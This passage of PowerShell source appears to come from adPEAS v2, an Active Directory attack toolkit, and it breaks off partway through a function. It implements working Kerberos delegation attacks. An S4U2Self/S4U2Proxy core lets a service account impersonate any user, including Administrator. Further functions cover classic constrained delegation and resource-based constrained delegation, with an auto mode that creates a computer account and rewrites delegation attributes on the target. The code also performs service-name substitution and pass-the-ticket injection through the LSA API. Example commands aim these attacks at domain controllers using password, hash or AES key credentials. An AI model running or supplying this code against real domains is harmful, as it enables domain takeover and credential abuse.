        Performs the complete S4U2Self + S4U2Proxy workflow with optional
        AlternateService substitution and Pass-the-Ticket.

        This is an internal function called by Invoke-ConstrainedDelegation
        and Invoke-RBCD. Do not call directly.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$ServiceAccount,

        [Parameter(Mandatory=$true)]
        [string]$ImpersonateUser,

        [Parameter(Mandatory=$true)]
        [string]$TargetSPN,

        [Parameter(Mandatory=$true)]
        [string]$Domain,

        [Parameter(Mandatory=$false)]
        [string]$Server,

        # Service Account Authentication (one of these)
        [Parameter(Mandatory=$false)]
        [System.Management.Automation.PSCredential]$ServiceCredential,

        [Parameter(Mandatory=$false)]
        [string]$ServicePassword,

        [Parameter(Mandatory=$false)]
        [string]$ServiceNTHash,

        [Parameter(Mandatory=$false)]
        [string]$ServiceAES256Key,

        [Parameter(Mandatory=$false)]
        [string]$ServiceAES128Key,

        # Flags
        [Parameter(Mandatory=$false)]
        [switch]$UseRBCD,

        [Parameter(Mandatory=$false)]
        [switch]$PTT,

        [Parameter(Mandatory=$false)]
        [string]$OutputKirbi,

        [Parameter(Mandatory=$false)]
        [string[]]$AlternateService
    )

    begin {
        Write-Log "[Invoke-S4UCore] Starting S4U workflow"
        Write-Log "[Invoke-S4UCore] Service Account: $ServiceAccount"
        Write-Log "[Invoke-S4UCore] Impersonate User: $ImpersonateUser"
        Write-Log "[Invoke-S4UCore] Target SPN: $TargetSPN"
        Write-Log "[Invoke-S4UCore] RBCD Mode: $UseRBCD"
    }

    process {
        try {
            # Resolve Server if not specified
            if (-not $Server) {
                if ($Script:LDAPContext -and $Script:LDAPContext.ContainsKey('Server') -and $Script:LDAPContext['Server']) {
                    $Server = $Script:LDAPContext['Server']
                    Write-Log "[Invoke-S4UCore] Using DC from session: $Server"
                } else {
                    $Server = Resolve-adPEASName -Type DC -Domain $Domain
                    if (-not $Server) {
                        throw "Could not resolve Domain Controller for domain '$Domain'. Specify -Server explicitly."
                    }
                    Write-Log "[Invoke-S4UCore] Resolved DC via DNS: $Server"
                }
            }

            # Step 1: Get TGT for Service Account
            Write-Log "[Invoke-S4UCore] Step 1: Requesting TGT for '$ServiceAccount'"

            $authParams = @{
                UserName         = $ServiceAccount
                Domain           = $Domain
                DomainController = $Server
            }

            if ($ServiceCredential) { $authParams['Credential'] = $ServiceCredential }
            elseif ($ServicePassword) { $authParams['Password'] = $ServicePassword }
            elseif ($ServiceNTHash) { $authParams['NTHash'] = $ServiceNTHash }
            elseif ($ServiceAES256Key) { $authParams['AES256Key'] = $ServiceAES256Key }
            elseif ($ServiceAES128Key) { $authParams['AES128Key'] = $ServiceAES128Key }
            else {
                throw "Service account authentication required. Provide -ServiceCredential, -ServicePassword, -ServiceNTHash, -ServiceAES256Key, or -ServiceAES128Key"
            }

            $tgtResult = Invoke-KerberosAuth @authParams

            if (-not $tgtResult -or -not $tgtResult.Success) {
                $errMsg = if ($tgtResult) { $tgtResult.Error } else { "No result returned" }
                throw "Failed to obtain TGT for '$ServiceAccount': $errMsg"
            }

            $tgtServer = $tgtResult.DomainController
            Write-Log "[Invoke-S4UCore] TGT acquired via $tgtServer (etype $($tgtResult.EncryptionType))"

            # Step 2: S4U2Self - Protocol Transition
            Write-Log "[Invoke-S4UCore] Step 2: S4U2Self - requesting ticket on behalf of '$ImpersonateUser'"

            $s4u2selfResult = Request-ServiceTicket `
                -TGT $tgtResult.TicketBytes `
                -SessionKey $tgtResult.SessionKeyBytes `
                -SessionKeyType $tgtResult.EncryptionType `
                -ServicePrincipalName $ServiceAccount `
                -Domain $Domain `
                -DomainController $tgtServer `
                -UserName $ServiceAccount `
                -S4U2Self `
                -ImpersonateUser $ImpersonateUser

            if (-not $s4u2selfResult -or -not $s4u2selfResult.Success) {
                $errMsg = if ($s4u2selfResult) { $s4u2selfResult.Message } else { "No result returned" }
                throw "S4U2Self failed: $errMsg"
            }

            Write-Log "[Invoke-S4UCore] S4U2Self succeeded (etype: $($s4u2selfResult.EncryptionType))"

            # Step 3: S4U2Proxy - Constrained Delegation
            Write-Log "[Invoke-S4UCore] Step 3: S4U2Proxy - forwarding ticket to '$TargetSPN'"

            $s4u2proxyParams = @{
                TGT                  = $tgtResult.TicketBytes
                SessionKey           = $tgtResult.SessionKeyBytes
                SessionKeyType       = $tgtResult.EncryptionType
                ServicePrincipalName = $TargetSPN
                Domain               = $Domain
                DomainController     = $tgtServer
                UserName             = $ServiceAccount
                S4U2Proxy            = $true
                AdditionalTicket     = $s4u2selfResult.TicketBytes
                ImpersonateUser      = $ImpersonateUser
            }

            if ($UseRBCD) {
                $s4u2proxyParams['ResourceBased'] = $true
                Write-Log "[Invoke-S4UCore] Using RBCD mode (PA-PAC-OPTIONS flag)"
            }

            $s4u2proxyResult = Request-ServiceTicket @s4u2proxyParams

            if (-not $s4u2proxyResult -or -not $s4u2proxyResult.Success) {
                $errMsg = if ($s4u2proxyResult) { $s4u2proxyResult.Message } else { "No result returned" }
                throw "S4U2Proxy failed: $errMsg"
            }

            Write-Log "[Invoke-S4UCore] S4U2Proxy succeeded (etype: $($s4u2proxyResult.EncryptionType))"

            # Extract target host from SPN for AlternateService
            $spnParts = $TargetSPN -split '/', 2
            $originalService = if ($spnParts.Count -ge 2) { $spnParts[0] } else { "" }
            $targetHost = if ($spnParts.Count -ge 2) { $spnParts[1] } else { $TargetSPN }

            # Build base KRB-CRED for original ticket (needed for PTT and AlternateService)
            $baseKrbCredParams = @{
                Ticket         = $s4u2proxyResult.TicketBytes
                SessionKey     = $s4u2proxyResult.SessionKey
                SessionKeyType = $s4u2proxyResult.EncryptionType
                Realm          = $Domain.ToUpper()
                ClientName     = $ImpersonateUser
                ServerName     = $TargetSPN
            }

            $baseKrbCred = Build-KRBCred @baseKrbCredParams

            # Step 4: AlternateService Substitution (optional)
            $alternateTickets = $null
            $altSPNList = $null
            $pttMessage = ""

            if ($AlternateService -and $AlternateService.Count -gt 0) {
                Write-Log "[Invoke-S4UCore] Step 4: Applying SPN substitution for $($AlternateService.Count) alternate service(s)"

                $alternateTickets = @()

                foreach ($altSvc in $AlternateService) {
                    $newSPN = "$altSvc/$targetHost"
                    Write-Log "[Invoke-S4UCore] Substituting: $TargetSPN -> $newSPN"

                    try {
                        # Build KRB-CRED with substituted ServerName
                        $altKrbCredParams = @{
                            Ticket         = $s4u2proxyResult.TicketBytes
                            SessionKey     = $s4u2proxyResult.SessionKey
                            SessionKeyType = $s4u2proxyResult.EncryptionType
                            Realm          = $Domain.ToUpper()
                            ClientName     = $ImpersonateUser
                            ServerName     = $newSPN
                        }

                        $altKrbCred = Build-KRBCred @altKrbCredParams

                        $altTicketObj = [PSCustomObject]@{
                            SPN         = $newSPN
                            TicketBytes = $altKrbCred
                            Imported    = $false
                        }

                        # Optional PTT for alternate ticket
                        if ($PTT) {
                            $pttResult = Import-KerberosTicket -TicketBytes $altKrbCred
                            if ($pttResult -and $pttResult.Success) {
                                $altTicketObj.Imported = $true
                                Write-Log "[Invoke-S4UCore] Alternate ticket imported: $newSPN"
                            } else {
                                Write-Warning "[!] Failed to import alternate ticket for $newSPN"
                            }
                        }

                        $alternateTickets += $altTicketObj
                    }
                    catch {
                        $errMsg = $_.Exception.Message
                        Write-Warning "[!] SPN substitution failed for ${newSPN}: $errMsg"
                    }
                }

                $importedCount = @($alternateTickets | Where-Object { $_.Imported }).Count
                if (-not $PTT) {
                    $pttMessage = " ($($AlternateService.Count) alternate ticket(s) - use -PTT to import)"
                } elseif ($importedCount -eq $AlternateService.Count) {
                    $pttMessage = " ($importedCount alternate ticket(s) imported)"
                } else {
                    $pttMessage = " ($importedCount/$($AlternateService.Count) alternate ticket(s) imported)"
                }

                $altSPNList = ($AlternateService | ForEach-Object { "$_/$targetHost" }) -join ', '
            }
            else {
                # No AlternateService - standard PTT for original ticket
                if ($PTT) {
                    Write-Log "[Invoke-S4UCore] Step 4: Importing ticket via Pass-the-Ticket"

                    $pttResult = Import-KerberosTicket -TicketBytes $baseKrbCred

                    if ($pttResult -and $pttResult.Success) {
                        $pttMessage = " (ticket imported)"
                        Write-Log "[Invoke-S4UCore] Ticket imported successfully"
                    } else {
                        $pttMessage = " (PTT failed - ticket available in result)"
                        Write-Warning "[!] PTT failed, ticket available in result object"
                    }
                } else {
                    $pttMessage = " (ticket not imported - use -PTT to import)"
                }
            }

            # Step 5: Export .kirbi (optional)
            if ($OutputKirbi) {
                # Resolve PSPath to filesystem path: [IO.File]::WriteAllBytes uses
                # Environment.CurrentDirectory, not PowerShell's $PWD.
                $outputPath = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($OutputKirbi)
                Write-Log "[Invoke-S4UCore] Exporting ticket to: $outputPath"

                try {
                    [System.IO.File]::WriteAllBytes($outputPath, $baseKrbCred)
                    Write-Log "[Invoke-S4UCore] Ticket exported successfully"
                }
                catch {
                    Write-Warning "[!] Failed to export .kirbi: $($_.Exception.Message)"
                }
            }

            # Build Result Object
            $delegationType = if ($UseRBCD) { "RBCD" } else { "Classic Constrained Delegation" }

            $result = [PSCustomObject]@{
                PSTypeName          = 'adPEAS.S4U.Result'
                Success             = $true
                DelegationType      = $delegationType
                ServiceAccount      = $ServiceAccount
                ImpersonateUser     = $ImpersonateUser
                TargetSPN           = $TargetSPN
                Domain              = $Domain
                DomainController    = $tgtServer
                TicketBytes         = $baseKrbCred
                Imported            = ($PTT -and -not $AlternateService)
                Message             = "S4U attack successful$pttMessage"
            }

            # Add AlternateService results if present
            if ($alternateTickets) {
                $result | Add-Member -NotePropertyName 'AlternateService' -NotePropertyValue $AlternateService
                $result | Add-Member -NotePropertyName 'AlternateTickets' -NotePropertyValue $alternateTickets
                $result | Add-Member -NotePropertyName 'AlternateSPNs' -NotePropertyValue $altSPNList
            }

            # Add OutputKirbi path if used
            if ($OutputKirbi) {
                $result | Add-Member -NotePropertyName 'KirbiFile' -NotePropertyValue $OutputKirbi
            }

            return $result
        }
        catch {
            Write-Log "[Invoke-S4UCore] S4U attack failed: $($_.Exception.Message)"

            return [PSCustomObject]@{
                PSTypeName      = 'adPEAS.S4U.Result'
                Success         = $false
                ServiceAccount  = $ServiceAccount
                ImpersonateUser = $ImpersonateUser
                TargetSPN       = $TargetSPN
                Domain          = $Domain
                Message         = "S4U attack failed"
                Error           = $_.Exception.Message
            }
        }
    }
}


# ============================================================================
# LAYER 2: Public Functions
# ============================================================================

function Invoke-ConstrainedDelegation {
    <#
    .SYNOPSIS
        Performs Classic Constrained Delegation attack using S4U2Self + S4U2Proxy.

    .DESCRIPTION
        Exploits Classic Constrained Delegation to impersonate any user (including
        protected users without delegation restrictions) to a target service.

        This attack leverages S4U extensions in the Kerberos protocol:
        - S4U2Self (Protocol Transition): Request a service ticket on behalf of another user
        - S4U2Proxy (Constrained Delegation): Forward the ticket to a target service

        Prerequisites:
        - Service account with msDS-AllowedToDelegateTo attribute configured
        - msDS-AllowedToDelegateTo must contain the target SPN
        - Service account credentials (password, hash, or AES key)

        Attack Scenarios:
        1. Classic CD: Service has msDS-AllowedToDelegateTo to target SPN
        2. AlternateService: Substitute service class (e.g., LDAP -> CIFS)

        Failure Cases:
        - KRB_AP_ERR_NOT_US (47): Protocol Transition not allowed on service account
        - KRB_AP_ERR_BADMATCH (36): Target SPN not in msDS-AllowedToDelegateTo
        - KDC_ERR_BADOPTION (13): Delegation flag not set on S4U2Self ticket

    .PARAMETER ServiceAccount
        Service account with msDS-AllowedToDelegateTo configured (sAMAccountName).

    .PARAMETER ImpersonateUser
        User to impersonate (sAMAccountName). Can be any user, including protected.

    .PARAMETER TargetSPN
        Target SPN from msDS-AllowedToDelegateTo list (e.g., "cifs/server.domain.com").

    .PARAMETER Domain
        Target domain FQDN.

    .PARAMETER Server
        Specific Domain Controller (optional, auto-resolved if not provided).

    .PARAMETER ServiceCredential
        PSCredential object for service account.

    .PARAMETER ServicePassword
        Plain-text password for service account.

    .PARAMETER ServiceNTHash
        NT hash for service account (Overpass-the-Hash).

    .PARAMETER ServiceAES256Key
        AES256 key for service account (Pass-the-Key).

    .PARAMETER ServiceAES128Key
        AES128 key for service account (Pass-the-Key).

    .PARAMETER PTT
        Automatically import ticket via Pass-the-Ticket (no admin required).

    .PARAMETER OutputKirbi
        Export ticket to .kirbi file (for use with Rubeus/Mimikatz).

    .PARAMETER AlternateService
        Array of service classes to substitute (e.g., @('ldap','cifs','host')).
        Enables service class substitution attack.

    .EXAMPLE
        Invoke-ConstrainedDelegation -ServiceAccount "websvc" -ImpersonateUser "Administrator" -TargetSPN "cifs/dc01.contoso.com" -Domain "contoso.com" -ServicePassword "P@ssw0rd"

        Impersonate Administrator to CIFS service on DC01 using websvc credentials.

    .EXAMPLE
        Invoke-ConstrainedDelegation -ServiceAccount "sqlsvc" -ImpersonateUser "da_user" -TargetSPN "mssql/sql01.contoso.com" -Domain "contoso.com" -ServiceNTHash "8846f7eaee8fb117ad06bdd830b7586c" -PTT

        Overpass-the-Hash attack with automatic ticket import.

    .EXAMPLE
        Invoke-ConstrainedDelegation -ServiceAccount "websvc" -ImpersonateUser "Administrator" -TargetSPN "http/web01.contoso.com" -Domain "contoso.com" -ServiceAES256Key "4a3b2c1d..." -AlternateService @('cifs','ldap','host') -PTT

        Substitute HTTP -> CIFS/LDAP/HOST on web01 and import all tickets.

    .OUTPUTS
        PSCustomObject with Success, ServiceAccount, ImpersonateUser, TargetSPN, TicketBytes, etc.

    .NOTES
        Author: Alexander Sturz
        Part of adPEAS v2
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$ServiceAccount,

        [Parameter(Mandatory=$true)]
        [string]$ImpersonateUser,

        [Parameter(Mandatory=$true)]
        [string]$TargetSPN,

        [Parameter(Mandatory=$true)]
        [string]$Domain,

        [Parameter(Mandatory=$false)]
        [string]$Server,

        # Service Account Authentication
        [Parameter(Mandatory=$false, ParameterSetName='Credential')]
        [System.Management.Automation.PSCredential]$ServiceCredential,

        [Parameter(Mandatory=$false, ParameterSetName='Password')]
        [string]$ServicePassword,

        [Parameter(Mandatory=$false, ParameterSetName='NTHash')]
        [string]$ServiceNTHash,

        [Parameter(Mandatory=$false, ParameterSetName='AES256')]
        [string]$ServiceAES256Key,

        [Parameter(Mandatory=$false, ParameterSetName='AES128')]
        [string]$ServiceAES128Key,

        # Options
        [Parameter(Mandatory=$false)]
        [switch]$PTT,

        [Parameter(Mandatory=$false)]
        [string]$OutputKirbi,

        [Parameter(Mandatory=$false)]
        [string[]]$AlternateService
    )

    begin {
        Write-Verbose "[Invoke-ConstrainedDelegation] Starting Classic Constrained Delegation attack"
    }

    process {
        # Build core parameters
        $coreParams = @{
            ServiceAccount  = $ServiceAccount
            ImpersonateUser = $ImpersonateUser
            TargetSPN       = $TargetSPN
            Domain          = $Domain
            UseRBCD         = $false
        }

        # Add optional parameters
        if ($Server) { $coreParams['Server'] = $Server }
        if ($ServiceCredential) { $coreParams['ServiceCredential'] = $ServiceCredential }
        if ($ServicePassword) { $coreParams['ServicePassword'] = $ServicePassword }
        if ($ServiceNTHash) { $coreParams['ServiceNTHash'] = $ServiceNTHash }
        if ($ServiceAES256Key) { $coreParams['ServiceAES256Key'] = $ServiceAES256Key }
        if ($ServiceAES128Key) { $coreParams['ServiceAES128Key'] = $ServiceAES128Key }
        if ($PTT) { $coreParams['PTT'] = $true }
        if ($OutputKirbi) { $coreParams['OutputKirbi'] = $OutputKirbi }
        if ($AlternateService) { $coreParams['AlternateService'] = $AlternateService }

        # Delegate to core function
        return Invoke-S4UCore @coreParams
    }
}

function Invoke-RBCD {
    <#
    .SYNOPSIS
        Performs Resource-Based Constrained Delegation (RBCD) attack.

    .DESCRIPTION
        Exploits Resource-Based Constrained Delegation (RBCD) to impersonate users
        to a target computer. Supports two modes:

        **Manual Mode:**
        - Requires control over a service account with SPN configured
        - Target computer must have msDS-AllowedToActOnBehalfOfOtherIdentity pointing to service account
        - You manually configure RBCD delegation before running attack

        **Auto Mode:**
        - Automatically creates a new computer account via LDAP
        - Configures RBCD delegation on target computer (via Set-DomainComputer)
        - Performs S4U attack with auto-generated credentials
        - Requires:
          - MachineAccountQuota > 0 (default 10)
          - GenericWrite/GenericAll on target computer object

        Attack Flow:
        1. [Auto only] Create computer account via New-DomainComputer
        2. [Auto only] Set msDS-AllowedToActOnBehalfOfOtherIdentity via Set-DomainComputer
        3. S4U2Self: Request ticket on behalf of target user
        4. S4U2Proxy: Forward ticket to target SPN (with PA-PAC-OPTIONS flag)
        5. [Optional] AlternateService substitution
        6. [Optional] Pass-the-Ticket import

        Prerequisites (Manual Mode):
        - Service account with SPN configured
        - Target computer has msDS-AllowedToActOnBehalfOfOtherIdentity configured
        - Service account credentials

        Prerequisites (Auto Mode):
        - Domain credentials with LDAP session active
        - MachineAccountQuota > 0
        - GenericWrite/GenericAll on target computer object

        Failure Cases:
        - Auto Mode: MachineAccountQuota exhausted
        - Auto Mode: No GenericWrite on target computer
        - KRB_AP_ERR_NOT_US (47): Protocol Transition not allowed
        - KDC_ERR_BADOPTION (13): PA-PAC-OPTIONS flag missing or invalid

    .PARAMETER ServiceAccount
        [Manual Mode] Service account with SPN (sAMAccountName).

    .PARAMETER TargetComputer
        [Auto Mode] Target computer to attack (sAMAccountName with or without $).

    .PARAMETER ImpersonateUser
        User to impersonate (sAMAccountName). Can be any user.

    .PARAMETER TargetSPN
        Target SPN (e.g., "cifs/server.domain.com" or "ldap/dc01.domain.com").

    .PARAMETER Domain
        Target domain FQDN.

    .PARAMETER Server
        Specific Domain Controller (optional).

    .PARAMETER ServiceCredential
        [Manual Mode] PSCredential for service account.

    .PARAMETER ServicePassword
        [Manual Mode] Plain-text password for service account.

    .PARAMETER ServiceNTHash
        [Manual Mode] NT hash for service account.

    .PARAMETER ServiceAES256Key
        [Manual Mode] AES256 key for service account.

    .PARAMETER ServiceAES128Key
        [Manual Mode] AES128 key for service account.

    .PARAMETER PTT
        Automatically import ticket via Pass-the-Ticket.

    .PARAMETER OutputKirbi
        Export ticket to .kirbi file.

    .PARAMETER AlternateService
        Array of service classes for substitution (e.g., @('cifs','ldap','host')).

    .EXAMPLE
        Invoke-RBCD -TargetComputer "DC01" -ImpersonateUser "Administrator" -TargetSPN "ldap/dc01.contoso.com" -Domain "contoso.com" -PTT

        Auto Mode: Create computer, configure RBCD, impersonate Administrator to LDAP on DC01, import ticket.

    .EXAMPLE
        Invoke-RBCD -ServiceAccount "EVILPC$" -ImpersonateUser "Administrator" -TargetSPN "cifs/fileserver.contoso.com" -Domain "contoso.com" -ServicePassword "P@ssw0rd" -PTT

        Manual Mode: Use existing EVILPC$ computer account.

    .EXAMPLE
        Invoke-RBCD -TargetComputer "WEB01" -ImpersonateUser "da_user" -TargetSPN "http/web01.contoso.com" -Domain "contoso.com" -AlternateService @('cifs','ldap') -PTT

        Auto Mode with service substitution (HTTP -> CIFS/LDAP).

    .OUTPUTS
        PSCustomObject with Success, ServiceAccount, ImpersonateUser, TargetSPN, TicketBytes, ComputerCreated, etc.

    .NOTES
        Author: Alexander Sturz
        Part of adPEAS v2
    #>
    [CmdletBinding(DefaultParameterSetName='Auto')]
    param(
        # Auto Mode Parameters
        [Parameter(Mandatory=$true, ParameterSetName='Auto')]
        [string]$TargetComputer,

        # Manual Mode Parameters
        [Parameter(Mandatory=$true, ParameterSetName='Manual-Credential')]
        [Parameter(Mandatory=$true, ParameterSetName='Manual-Password')]
        [Parameter(Mandatory=$true, ParameterSetName='Manual-NTHash')]
        [Parameter(Mandatory=$true, ParameterSetName='Manual-AES256')]
        [Parameter(Mandatory=$true, ParameterSetName='Manual-AES128')]
        [string]$ServiceAccount,

        # Common Parameters
        [Parameter(Mandatory=$true)]
        [string]$ImpersonateUser,

        [Parameter(Mandatory=$true)]
        [string]$TargetSPN,

        [Parameter(Mandatory=$false)]
        [string]$Domain,

        [Parameter(Mandatory=$false)]
        [string]$Server,

        # Manual Mode Authentication
        [Parameter(Mandatory=$true, ParameterSetName='Manual-Credential')]
        [System.Management.Automation.PSCredential]$ServiceCredential,

        [Parameter(Mandatory=$true, ParameterSetName='Manual-Password')]
        [string]$ServicePassword,

        [Parameter(Mandatory=$true, ParameterSetName='Manual-NTHash')]
        [string]$ServiceNTHash,

        [Parameter(Mandatory=$true, ParameterSetName='Manual-AES256')]
        [string]$ServiceAES256Key,

        [Parameter(Mandatory=$true, ParameterSetName='Manual-AES128')]
        [string]$ServiceAES128Key,

        # Options
        [Parameter(Mandatory=$false)]
        [switch]$PTT,

        [Parameter(Mandatory=$false)]
        [string]$OutputKirbi,

        [Parameter(Mandatory=$false)]
        [string[]]$AlternateService
    )

    begin {
        $isAutoMode = $PSCmdlet.ParameterSetName -eq 'Auto'
        $modeText = if ($isAutoMode) { 'Auto' } else { 'Manual' }
        Write-Verbose "[Invoke-RBCD] Starting RBCD attack (Mode: $modeText)"
    }

    process {
        try {
            # Resolve domain if not specified
            if (-not $Domain) {
                if (-not (Ensure-LDAPConnection)) {
                    throw "No LDAP session active and -Domain not specified. Use Connect-adPEAS first or specify -Domain parameter."
                }
                $Domain = $Script:LDAPContext.Domain
                Write-Verbose "[Invoke-RBCD] Using domain from session: $Domain"
            }

            # Auto Mode: Create computer and configure RBCD
            if ($isAutoMode) {
                Write-Verbose "[Invoke-RBCD] Auto Mode: Creating computer and configuring RBCD delegation"

                # Ensure LDAP session exists
                if (-not (Ensure-LDAPConnection)) {
                    throw "Auto Mode requires an active LDAP session. Use Connect-adPEAS first."
                }

                # Build connection parameters for helpers
                $connectionParams = @{}
                if ($Domain) { $connectionParams['Domain'] = $Domain }
                if ($Server) { $connectionParams['Server'] = $Server }

                # Normalize TargetComputer (ensure $ suffix)
                $targetComputerNormalized = if ($TargetComputer.EndsWith('$')) {
                    $TargetComputer
                } else {
                    "$TargetComputer`$"
                }

                # Step 1: Generate computer name and password
                $newComputerName = "RBCD-$(Get-Random -Minimum 1000 -Maximum 9999)"
                $newComputerPassword = New-SafePassword -Length 32
                Write-Verbose "[Invoke-RBCD] Generated computer name: $newComputerName"

                # Step 2: Create computer account
                Write-Verbose "[Invoke-RBCD] Creating computer account: $newComputerName"
                $createResult = New-DomainComputer -ComputerName $newComputerName -Password $newComputerPassword @connectionParams

                if (-not $createResult -or -not $createResult.Success) {
                    $errMsg = if ($createResult) { $createResult.Error } else { "No result returned" }
                    throw "Failed to create computer account: $errMsg"
                }

                $newComputerSamAccountName = $createResult.SamAccountName
                $newComputerDN = $createResult.DistinguishedName
                Write-Verbose "[Invoke-RBCD] Computer account created: $newComputerDN"

                # Step 3: Configure RBCD delegation on target computer
                Write-Verbose "[Invoke-RBCD] Configuring msDS-AllowedToActOnBehalfOfOtherIdentity on $targetComputerNormalized"

                # Get new computer's SID
                $newComputerObj = Get-DomainComputer -Identity $newComputerSamAccountName @connectionParams
                if (-not $newComputerObj -or -not $newComputerObj.objectSid) {
                    throw "Failed to retrieve SID for newly created computer '$newComputerSamAccountName'"
                }

                $newComputerSID = $newComputerObj.objectSid

                # Build security descriptor for RBCD
                $sd = New-Object System.DirectoryServices.ActiveDirectorySecurity
                $identity = New-Object System.Security.Principal.SecurityIdentifier($newComputerSID)
                $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
                    $identity,
                    [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
                    [System.Security.AccessControl.AccessControlType]::Allow
                )
                $sd.AddAccessRule($ace)

                # Get SDDL bytes
                $sdBytes = $sd.GetSecurityDescriptorBinaryForm()

                # Set msDS-AllowedToActOnBehalfOfOtherIdentity
                $setResult = Set-DomainComputer -Identity $targetComputerNormalized -msDS_AllowedToActOnBehalfOfOtherIdentity $sdBytes @connectionParams

                if (-not $setResult -or -not $setResult.Success) {
                    # Cleanup: Remove created computer
                    Write-Warning "[!] Failed to configure RBCD delegation, cleaning up computer account"
                    try {
                        Remove-DomainObject -Identity $newComputerDN @connectionParams -ErrorAction SilentlyContinue
                    } catch {
                        Write-Warning "[!] Cleanup failed: $($_.Exception.Message)"
                    }

                    $errMsg = if ($setResult) { $setResult.Error } else { "No result returned" }
                    throw "Failed to configure RBCD delegation: $errMsg"
                }

                Write-Verbose "[Invoke-RBCD] RBCD delegation configured successfully"

                # Step 4: Perform S4U attack
                Write-Verbose "[Invoke-RBCD] Performing S4U attack with created computer account"

                $coreParams = @{
                    ServiceAccount  = $newComputerSamAccountName
                    ServicePassword = $newComputerPassword
                    ImpersonateUser = $ImpersonateUser
                    TargetSPN       = $TargetSPN
                    Domain          = $Domain
                    UseRBCD         = $true
                }

                if ($Server) { $coreParams['Server'] = $Server }
                if ($PTT) { $coreParams['PTT'] = $true }
                if ($OutputKirbi) { $coreParams['OutputKirbi'] = $OutputKirbi }
                if ($AlternateService) { $coreParams['AlternateService'] = $AlternateService }

                $s4uResult = Invoke-S4UCore @coreParams

                # Add Auto Mode metadata
                if ($s4uResult) {
                    $s4uResult | Add-Member -NotePropertyName 'Mode' -NotePropertyValue 'Auto' -Force
                    $s4uResult | Add-Member -NotePropertyName 'ComputerCreated' -NotePropertyValue $newComputerName -Force
                    $s4uResult | Add-Member -NotePropertyName 'ComputerDN' -NotePropertyValue $newComputerDN -Force
                    $s4uResult | Add-Member -NotePropertyName 'TargetComputer' -NotePropertyValue $targetComputerNormalized -Force
                }

                return $s4uResult
            }
            else {
                # Manual Mode: Use existing service account
                Write-Verbose "[Invoke-RBCD] Manual Mode: Using existing service account '$ServiceAccount'"

                $coreParams = @{
                    ServiceAccount  = $ServiceAccount
                    ImpersonateUser = $ImpersonateUser
                    TargetSPN       = $TargetSPN
                    Domain          = $Domain
                    UseRBCD         = $true
                }

                if ($Server) { $coreParams['Server'] = $Server }
                if ($ServiceCredential) { $coreParams['ServiceCredential'] = $ServiceCredential }
                if ($ServicePassword) { $coreParams['ServicePassword'] = $ServicePassword }
                if ($ServiceNTHash) { $coreParams['ServiceNTHash'] = $ServiceNTHash }
                if ($ServiceAES256Key) { $coreParams['ServiceAES256Key'] = $ServiceAES256Key }
                if ($ServiceAES128Key) { $coreParams['ServiceAES128Key'] = $ServiceAES128Key }
                if ($PTT) { $coreParams['PTT'] = $true }
                if ($OutputKirbi) { $coreParams['OutputKirbi'] = $OutputKirbi }
                if ($AlternateService) { $coreParams['AlternateService'] = $AlternateService }

                $s4uResult = Invoke-S4UCore @coreParams

                # Add Manual Mode metadata
                if ($s4uResult) {
                    $s4uResult | Add-Member -NotePropertyName 'Mode' -NotePropertyValue 'Manual' -Force
                }

                return $s4uResult
            }
        }
        catch {
            Write-Verbose "[Invoke-RBCD] RBCD attack failed: $($_.Exception.Message)"

            $errorResult = [PSCustomObject]@{
                PSTypeName      = 'adPEAS.S4U.Result'
                Success         = $false
                DelegationType  = "RBCD"
                Mode            = if ($isAutoMode) { "Auto" } else { "Manual" }
                ImpersonateUser = $ImpersonateUser
                TargetSPN       = $TargetSPN
                Domain          = $Domain
                Message         = "RBCD attack failed"
                Error           = $_.Exception.Message
            }

            if ($isAutoMode -and $newComputerName) {
                $errorResult | Add-Member -NotePropertyName 'ComputerCreated' -NotePropertyValue $newComputerName
            }
            if ($ServiceAccount) {
                $errorResult | Add-Member -NotePropertyName 'ServiceAccount' -NotePropertyValue $ServiceAccount
            }

            return $errorResult
        }
    }
}



# ----- Import-KerberosTicket.ps1 -----

function Import-KerberosTicket {
<#
.SYNOPSIS
    Imports a Kerberos ticket into the current Windows logon session (Pass-the-Ticket).

.DESCRIPTION
    This function injects a Kerberos ticket (TGT or TGS) into the current user's  Windows logon session using the LSA API (LsaCallAuthenticationPackage with  KERB_SUBMIT_TKT_REQUEST).
    After importing, the ticket will be used automatically by Windows for  Kerberos authentication (LDAP, SMB, etc.).

    This is the PowerShell equivalent of "Rubeus ptt" or "mimikatz kerberos::ptt".

    The -Kirbi and -Ccache parameters accept either:
    - A file path to a .kirbi or .ccache file
    - A Base64-encoded string (standard or URL-safe)
    The function automatically detects the input type.

.PARAMETER TicketBytes
    The raw Kerberos ticket bytes (KRB-CRED format or raw ticket).

.PARAMETER TicketBase64
    The Kerberos ticket as Base64-encoded string.

.PARAMETER Kirbi
    Path to a .kirbi file OR Base64-encoded kirbi data.
    The function auto-detects whether the input is Base64 or a file path.

.PARAMETER Ccache
    Path to a .ccache file OR Base64-encoded ccache data.
    Used by Linux systems and tools like impacket.
    The function auto-detects whether the input is Base64 or a file path.

.PARAMETER SessionKey
    Optional session key bytes for the ticket.

.PARAMETER SessionKeyType
    Encryption type of the session key (default: 18 for AES256).

.PARAMETER LUID
    Optional Logon ID to import the ticket into. Default: current session.

.EXAMPLE
    Import-KerberosTicket -TicketBase64 "YII..."
    Imports a Base64-encoded ticket into the current session.

.EXAMPLE
    Import-KerberosTicket -Kirbi "ticket.kirbi"
    Imports a ticket from a .kirbi file.

.EXAMPLE
    Import-KerberosTicket -Kirbi "YIIKwgYJKoZIhvc..."
    Imports a ticket from a Base64-encoded string.

.EXAMPLE
    Import-KerberosTicket -Ccache "/tmp/krb5cc_1000"
    Imports a ticket from a Linux ccache file.

.EXAMPLE
    $authResult = Invoke-KerberosAuth -UserName "admin" -Domain "contoso.com" -NTHash "..."
    Import-KerberosTicket -TicketBytes $authResult.TicketBytes -SessionKey $authResult.SessionKeyBytes
    Gets a TGT and imports it into the session.

.OUTPUTS
    PSCustomObject with import result.

.NOTES
    Author: Alexander Sturz (@_61106960_)
#>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$false)]
        [byte[]]$TicketBytes,

        [Parameter(Mandatory=$false)]
        [string]$TicketBase64,

        [Parameter(Mandatory=$false)]
        [string]$Kirbi,

        [Parameter(Mandatory=$false)]
        [string]$Ccache,

        [Parameter(Mandatory=$false)]
